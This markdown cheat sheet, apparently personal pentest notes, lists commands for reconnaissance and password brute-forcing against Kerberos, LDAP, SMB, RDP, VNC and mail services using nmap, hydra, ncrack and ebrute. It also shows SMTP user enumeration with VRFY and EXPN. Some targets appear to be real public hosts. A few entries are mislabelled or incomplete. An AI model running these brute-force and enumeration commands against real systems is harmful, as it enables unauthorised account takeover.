### Domain Security Accessment

```
Kerberos Recon

Port 	88 	Kerberous
Port 	464 Kpassword
Port 	749 Kerberos-admin

Username enumeration Kerberos With Nmap

nmap -Pn -sV -p389 --script ldap-rootdse,ldap-search 50.116.56.5


Brute-force password grinding

ebrute.exe -r kerbenum -U users.txt -e research -h 172.16.102.11

```


### LDAP Attacking 


```
LDAP Recon

Port 	389 LADP
Port 	636 LDAPS


Fingerprinting and Anonymous Blind With Nmap

nmap -Pn -sV -p389 --script ldap-rootdse,ldap-search 50.116.56.5

Brute-Force Password 

ebrute.exe -r ldap -u da_craigb -h 172.16.102.12 -e research -t 10 -P pass.txt
 
 ```
 
 
 
 ### Attacking VNC Servers
 
```

Recon VNC with Nmap

nmap -Pn -sSVC -p5900 128.32.147.121

nmap -sSUC -p111 192.168.10.1
 
```

### Attacking SMB 

```
enum4linux -U -S -P -o 192.168.1.15 (Anonymous IPC Access via SMB) 
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1

```
### Attacking RDP Service

```
RDP brute-force

ncrack -vv --user Administrator –P common.txt 10.0.0.4:3389

nmap -p3389 --script rdp-enum-encryption 10.0.0.4(Transport Security)

```

### Mail Services Attacking


```
dig +short mx fb.com
telnet mxa-00082601.gslb.pphosted.com 25
nmap -sV -p25 mxa-00082601.gslb.pphosted.com
nmap -p25 --script smtp-commands 207.46.163.138

```

### User Account Enumeration

```
telnet 10.0.10.11 25
HELO world
EXPN test
EXPN root

The VRFY command verifies that a given SMTP mail address is valid
telnet 10.0.10.11 25
HELO world
VRFY test
VRFY chris


RCPT TO

telnet 10.0.10.11 25
HELO world
MAIL FROM:test@test.org
RCPT TO:chri
```

### POP3 Service Fingerprinting

```
nmap -sV -p110,995 --script pop3-capabilities 85.214.111.132

hydra -L users.txt -P crackdict.txt pop3s://mail.example.org

```

### IMAP Service Fingerprinting


```
nmap -sV -p143,993 --script imap-capabilities 85.214.111.174

hydra imap -U

```
